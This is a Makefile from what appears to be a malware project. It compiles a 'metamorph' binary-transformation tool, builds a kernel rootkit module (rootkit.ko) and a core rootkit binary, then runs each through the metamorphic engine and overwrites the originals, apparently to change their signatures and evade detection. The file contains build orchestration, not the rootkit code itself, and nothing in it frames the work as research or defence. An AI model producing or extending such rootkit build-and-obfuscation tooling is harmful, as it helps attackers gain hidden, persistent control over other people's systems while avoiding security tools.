CC         = gcc
CFLAGS     = -Wall -Wextra -O2
SRCS       = metamorph.c elf_utils.c rand_utils.c transforms.c
TARGET     = metamorph
MODULE_DIR = ../rootkit_module

all: $(TARGET) rootkit

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $@ $^

rootkit: $(TARGET)
	$(MAKE) -C $(MODULE_DIR) _build_module _build_core
	@echo ""
	@echo "[*] metamorph : rootkit.ko"
	./$(TARGET) $(MODULE_DIR)/rootkit.ko $(MODULE_DIR)/rootkit.ko.morph --ko
	mv $(MODULE_DIR)/rootkit.ko.morph $(MODULE_DIR)/rootkit.ko
	@echo "[*] metamorph : rootkit (core)"
	./$(TARGET) $(MODULE_DIR)/rootkit $(MODULE_DIR)/rootkit.morph
	mv $(MODULE_DIR)/rootkit.morph $(MODULE_DIR)/rootkit
	@echo "[✓] done"

clean:
	rm -f $(TARGET)
	$(MAKE) -C $(MODULE_DIR) clean

.PHONY: all rootkit clean
